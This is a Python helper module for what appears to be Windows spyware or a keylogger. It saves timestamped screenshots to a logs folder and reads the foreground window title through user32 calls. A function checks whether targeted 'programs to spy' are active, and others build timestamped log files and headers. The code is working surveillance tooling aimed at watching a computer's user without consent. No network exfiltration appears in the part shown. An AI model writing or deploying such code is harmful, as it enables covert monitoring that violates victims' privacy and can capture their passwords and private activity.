from mss import mss
from ctypes import windll, create_unicode_buffer
from datetime import datetime


class Helper:

    @staticmethod
    def print_screen():
        """
        This function will take a screenshot and save it on disk. The name of screenshot will be the same as
        the date when the screenshot was taken.
        """

        with mss() as screenshot_tool:
            path = "logs\\" + Helper.get_current_date()
            screenshot_tool.shot(mon=-1, output=f"{path}.png")

    @staticmethod
    def get_foreground_window_title():
        """
        This function returns the name of the foreground window. If there is no window in the foreground
        then it will return an empty string.

        :return: Foreground window title
        """

        hwnd = windll.user32.GetForegroundWindow()
        text_length = windll.user32.GetWindowTextLengthW(hwnd)
        buffer = create_unicode_buffer(text_length + 1)
        windll.user32.GetWindowTextW(hwnd, buffer, text_length + 1)

        if buffer.value:
            return str(buffer.value).lower()
        else:
            return ""

    @staticmethod
    def programs_to_spy_are_running(spy_these_programs):
        """
        This function checks if at least one of the programs to spy is currently running in the foreground window.

        :param spy_these_programs: Programs to spy
        :return: Currently running programs to spy
        """

        foreground_window_title = Helper.get_foreground_window_title()
        running_program = filter(lambda x: x in foreground_window_title, spy_these_programs)
        return list(running_program)

    @staticmethod
    def get_current_date():
        """
        This function returns the current formatted date.

        :return: Current formatted date
        """

        current_date = datetime.now()
        formatted_date = current_date.strftime("%d.%m.%Y ; %H;%M;%S")
        return formatted_date

    @staticmethod
    def get_new_file_name():
        """
        This function generates a file name, based on the current date.

        :return: New file name based on the current date.
        """

        current_date = Helper.get_current_date()
        file_name = f"{current_date}.txt"
        return file_name

    @staticmethod
    def get_logging_header():
        """
        This function returns a header with the current date and foreground window title.

        :return: Header with the current date and foreground window title
        """

        current_date = Helper.get_current_date()
        foreground_window_title = Helper.get_foreground_window_title()
        return f"\n\n {current_date} - {foreground_window_title} \n"
